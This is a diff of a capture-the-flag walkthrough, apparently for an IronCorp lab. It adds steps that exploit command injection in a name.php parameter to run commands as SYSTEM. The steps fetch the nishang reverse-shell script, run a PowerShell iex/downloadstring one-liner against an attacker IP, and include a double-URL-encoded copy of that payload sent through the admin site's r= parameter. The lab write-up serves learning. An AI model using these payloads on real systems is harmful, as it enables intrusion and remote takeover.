@@ -613,7 +613,27 @@ A:active {
 <img width="683" height="237" alt="image" src="https://github.com/user-attachments/assets/c5cc46a8-9e37-40ea-ba82-ef4c2f85f89e" />
 
 
-<h3>Search: http://internal.ironcorp.me:11025/name.php?name=hello|whoami)</h3>
+<br>
+<br>
+<h3>Search: http://internal.ironcorp.me:11025/name.php?ls<h3>
+<p>
+
+- Notice:  Undefined index: name in E:\xampp\htdocs\internal\name.php on line 8<br>Equinox</p>
+
+<img width="1124" height="304" alt="image" src="https://github.com/user-attachments/assets/8f543fb3-bfd6-44f7-91c8-982104028c18" />
+
+<br>
+<br>
+<h3>Search: http://internal.ironcorp.me:11025/name.php?name=hello</h3>
+<p>
+
+- Equinoxhello</p>
+
+<img width="1130" height="257" alt="image" src="https://github.com/user-attachments/assets/db940db3-daa4-467a-941d-cf624667e563" />
+
+<br>
+<br>
+<h3>Search: http://internal.ironcorp.me:11025/name.php?name=hello|whoami</h3>
 <p>
 
 - nt authority\system</p>
@@ -623,13 +643,15 @@ A:active {
 <br>
 <br>
 
-
 <h3>Download Invoke-PowerShellTcp.ps1</h3>
 <p>
 
 - https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1</p>
 
 <br>
+
+
+http://internal.ironcorp.me:11025/name.php?name=
 
 
 <h3>edited adding the below, saved, set up a http server</h3>
@@ -657,6 +679,16 @@ Listening on 0.0.0.0 9001
 
 
 
+powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.201.42.232/Invoke.ps1')
+
+
+=
+
+Searh: 
+http://internal.ironcorp.me:11025/name.php?name=hello|%25%37%30%25%36%66%25%37%37%25%36%35%25%37%32%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%36%35%25%37%38%25%36%35%25%32%30%25%32%64%25%36%33%25%32%30%25%36%39%25%36%35%25%37%38%25%32%38%25%36%65%25%36%35%25%37%37%25%32%64%25%36%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%32%30%25%36%65%25%36%35%25%37%34%25%32%65%25%37%37%25%36%35%25%36%32%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%32%39%25%32%65%25%36%34%25%36%66%25%37%37%25%36%65%25%36%63%25%36%66%25%36%31%25%36%34%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%38%25%32%37%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%31%25%33%30%25%32%65%25%33%32%25%33%30%25%33%31%25%32%65%25%33%34%25%33%32%25%32%65%25%33%32%25%33%33%25%33%32%25%32%66%25%34%39%25%36%65%25%37%36%25%36%66%25%36%62%25%36%35%25%32%65%25%37%30%25%37%33%25%33%31%25%32%37%25%32%39
+
+
+http://admin.ironcorp.me:11025/?r=http%3A%2F%2F10.201.42.232%3A8000%2FInvoke.ps1#
 
 
 <img width="1137" height="562" alt="image" src="https://github.com/user-attachments/assets/40f38dfe-1558-4ed4-af01-a5fea68b255f" />
